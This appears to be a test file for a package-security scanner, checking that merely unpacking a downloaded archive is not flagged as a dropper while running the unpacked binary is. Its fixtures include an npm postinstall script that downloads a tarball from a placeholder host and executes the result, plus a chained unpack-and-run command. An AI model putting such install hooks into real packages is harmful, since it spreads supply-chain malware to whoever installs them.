"""Unpacking a downloaded archive is not running it (review 98).

`SUSPECT.DROPPER.001` reads `execSync("tar -xzf ...")` beside a download as a spawn and a
decompression -- its third signal. The unpacker runs nothing it fetched; what runs a fetched
binary is a spawn of that binary, which still counts.
"""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.detect.code.capability import CapabilityDetector
from cordon_scanner.foundation.config import Config
from cordon_scanner.foundation.models import Severity

DOWNLOAD = (
    "const https = require('https');\n"
    "const fs = require('fs');\n"
    "const { execSync } = require('child_process');\n"
    "https.get('https://example.invalid/tool-1.0.0.tgz', (res) => {\n"
    "  const out = fs.createWriteStream('tool.tgz');\n"
    "  res.pipe(out);\n"
    "  out.on('finish', () => {\n"
    '    execSync(`tar -xzf "tool.tgz" -C "bin"`, { stdio: "inherit" });\n'
    "{RUN}"
    "  });\n"
    "});\n"
)


class DropperKit:
    @staticmethod
    def package(tmp_path: Path, script: str) -> Path:
        manifest = json.dumps(
            {"name": "tool", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}
        )
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for member, text in {
                "package/package.json": manifest,
                "package/install.js": script,
            }.items():
                data = text.encode()
                info = tarfile.TarInfo(member)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        target = tmp_path / "tool-1.0.0.tgz"
        target.write_bytes(buffer.getvalue())
        return target

    @staticmethod
    def droppers(target: Path) -> list[Severity]:
        found = Scanner(Config.default().with_overrides(use_cache=False)).scan(target).findings
        return [
            f.severity for f in found if f.rule_id in ("SUSPECT.DROPPER.001", "MALWARE.DROPPER.001")
        ]


class TestTheUnpacker:
    def test_unpacking_a_download_is_not_a_dropper(self, tmp_path):
        target = DropperKit.package(tmp_path, DOWNLOAD.replace("{RUN}", ""))
        assert all(s < Severity.HIGH for s in DropperKit.droppers(target))

    def test_running_what_was_unpacked_still_is(self, tmp_path):
        run = '    execSync("./bin/tool --setup", { stdio: "inherit" });\n'
        target = DropperKit.package(tmp_path, DOWNLOAD.replace("{RUN}", run))
        assert any(s >= Severity.HIGH for s in DropperKit.droppers(target))

    def test_an_unpack_chained_to_a_run_is_not_only_an_unpack(self):
        line = b"execSync(`tar -xzf x.tgz && ./x`)"
        assert not CapabilityDetector._UNPACKER_CALL.match(line)
